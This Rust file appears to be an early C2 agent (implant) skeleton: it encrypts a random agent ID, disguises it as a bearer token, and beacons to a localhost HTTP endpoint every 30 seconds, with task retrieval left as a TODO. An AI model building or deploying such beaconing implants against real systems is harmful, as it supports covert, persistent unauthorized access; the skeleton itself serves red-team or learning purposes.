use std::{thread, time::Duration};

use base64::prelude::*;
use common::crypt::aes;
use rand::{distributions::Alphanumeric, Rng};
use rsa::{pkcs1::DecodeRsaPublicKey, Pkcs1v15Encrypt, RsaPublicKey};

const PUBLIC_RSA_KEY: &str = r#"
-----BEGIN RSA PUBLIC KEY-----
-----END RSA PUBLIC KEY-----
"#;

fn aes_encrypt(message: &str) -> String {
    let key: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(32)
        .map(char::from)
        .collect();

    let aes_ciphertext = aes::encrypt(&key, message).expect("Failed to encrypt");
    format!("{}{}", key, aes_ciphertext)
}

fn rsa_encrypt(message: &str) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let pubk = RsaPublicKey::from_pkcs1_pem(PUBLIC_RSA_KEY).expect("Failed to read public key");

    pubk.encrypt(&mut rng, Pkcs1v15Encrypt, message.as_bytes())
        .expect("RSA encrypt failed")
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let agent_id = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(12)
        .map(char::from)
        .collect::<String>()
        .to_uppercase();

    let beacon = || {
        let fake_bearer = BASE64_STANDARD.encode(rsa_encrypt(&aes_encrypt(&agent_id)));

        ureq::get("http://127.0.0.1:9999/index.html")
            .set("Authorization", &format!("Bearer {}", fake_bearer))
            .call()
            .unwrap(); // TODO: Replace unwrap with non panic code
    };

    rayon::scope(|s| {
        s.spawn(|_| loop {
            beacon();
            thread::sleep(Duration::from_secs(30));
        });
        // s.spawn(|_| loop {
        //     // TODO: Obtain tasks
        // });
    });

    Ok(())
}
